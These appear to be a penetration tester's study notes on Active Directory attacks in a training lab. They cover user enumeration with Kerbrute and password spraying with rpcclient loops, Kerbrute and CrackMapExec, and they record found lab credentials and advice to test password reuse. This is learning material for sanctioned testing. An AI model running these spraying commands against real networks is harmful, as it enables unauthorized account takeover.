
1. We first need a valid list of users
	1. How?
	  - Leverage an SMB Null session
	  - Utilize LDAP anonymous bind
	  - User [[Kerbrute]] with a userlist

#### Use Kerbrute to get a list of valid users:
`sudo kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_users.txt
`

==You must keep a log of what you are doing==
Why? -> What if a malicious actor is in the network when you are as well? How would your client know?


## Internal Password Spraying with Linux:
1. Now that we have a valid list of usernames, we can attempt to spray passwords.

```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

##### Kerbrute:
```
# Spray the password: Welcome1 to all the users in 'valid_users.txt'

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
==Creds:== sgage:Welcome1[^1]
avazquez:Password123

> [!NOTE] Internal Spray with CrackMapExec
> ```shell-session
> # Use grep to show only successful sprays
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep + 


^ ^ Validate credentials with CME:
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123


### Test for password reuse!
1. If you gather admin credentials, try them in as many other places as possible in the domain
2. If a user has a standard account and an admin account, try the creds on the admin account as well.
